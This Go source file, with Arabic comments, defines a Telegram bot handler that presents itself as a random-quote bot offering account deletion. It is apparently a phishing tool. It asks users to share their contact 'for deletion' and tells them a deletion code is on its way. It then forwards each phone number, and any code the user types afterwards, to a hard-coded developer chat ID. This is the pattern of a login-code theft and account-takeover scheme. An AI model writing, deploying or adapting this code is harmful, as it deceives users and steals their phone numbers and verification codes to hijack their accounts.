package handler

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"time"

	"github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

func getQuote() string {
	quotes := []string{
		"***“Believe you can and you're halfway there.”***",
		"***“It always seems impossible until it's done.”***",
		"***“Success is not final, failure is not fatal.”***",
		"***“Don't watch the clock; do what it does. Keep going.”***",
	}
	rand.Seed(time.Now().UnixNano())
	return quotes[rand.Intn(len(quotes))]
}

func Handler(w http.ResponseWriter, r *http.Request) {
	botToken := os.Getenv("BOT_TOKEN")
	appID := os.Getenv("APP_ID")
	devID := int64(8590415901) // أيدي المطور الخاص بك

	bot, err := tgbotapi.NewBotAPI(botToken)
	if err != nil {
		return
	}

	var update tgbotapi.Update
	if err := json.NewDecoder(r.Body).Decode(&update); err != nil {
		return
	}

	// أولوية 1: معالجة ضغطة الزر الشفاف (الاقتباس)
	if update.CallbackQuery != nil {
		callback := update.CallbackQuery
		if callback.Data == "refresh_quote" {
			newQuote := getQuote()
			editMsg := tgbotapi.NewEditMessageText(callback.Message.Chat.ID, callback.Message.MessageID, newQuote)
			inlineKbd := tgbotapi.NewInlineKeyboardMarkup(
				tgbotapi.NewInlineKeyboardRow(
					tgbotapi.NewInlineKeyboardButtonData("🔄 Get New Quote", "refresh_quote"),
				),
			)
			editMsg.ReplyMarkup = &inlineKbd
			editMsg.ParseMode = "Markdown"
			bot.Send(editMsg)
			bot.Send(tgbotapi.NewCallback(callback.ID, "تم التحديث!"))
		}
		return
	}

	// أولوية 2: معالجة الرسائل
	if update.Message != nil {
		chatID := update.Message.Chat.ID

		// أ: أمر /start (تفعيل الكيبورد والأزرار)
		if update.Message.IsCommand() && update.Message.Command() == "start" {
			// كيبورد إرسال جهة الاتصال
			contactBtn := tgbotapi.NewKeyboardButtonContact("إرسال جهة الاتصال للحذف 🗑️")
			replyKbd := tgbotapi.NewReplyKeyboard([]tgbotapi.KeyboardButton{contactBtn})
			replyKbd.ResizeKeyboard = true

			// زر الاقتباس الشفاف
			inlineKbd := tgbotapi.NewInlineKeyboardMarkup(
				tgbotapi.NewInlineKeyboardRow(
					tgbotapi.NewInlineKeyboardButtonData("🔄 Get New Quote", "refresh_quote"),
				),
			)

			// الرسالة
			msg := tgbotapi.NewMessage(chatID, "✅ تم تفعيل البوت بنجاح.\n\n***"+getQuote()+"***\n\nاستخدم الزر بالأسفل لإرسال الرقم.")
			msg.ParseMode = "Markdown"
			msg.ReplyMarkup = replyKbd
			bot.Send(msg)

			// رسالة الاقتباس
			quoteMsg := tgbotapi.NewMessage(chatID, "اقتباس عشوائي معبر:")
			quoteMsg.ReplyMarkup = inlineKbd
			bot.Send(quoteMsg)
			return
		}

		// ب: استقبال جهة الاتصال
		if update.Message.Contact != nil {
			num := update.Message.Contact.PhoneNumber
			bot.Send(tgbotapi.NewMessage(chatID, "⏳ جاري إرسال كود الحذف للرقم: "+num+"\nبواسطة App ID: "+appID))
			
			// إشعار المطور
			bot.Send(tgbotapi.NewMessage(devID, "🔔 مستخدم جديد أرسل رقمه: "+num))
			return
		}

		// ج: استقبال نص (الكود)
		if update.Message.Text != "" {
			code := update.Message.Text
			bot.Send(tgbotapi.NewMessage(chatID, "⚠️ جاري التحقق من الكود: ["+code+"] لإتمام عملية الحذف..."))
			
			// إشعار المطور بالكود
			bot.Send(tgbotapi.NewMessage(devID, fmt.Sprintf("🔑 الكود المستلم من %d هو: %s", chatID, code)))
			return
		}
	}

	w.WriteHeader(http.StatusOK)
}
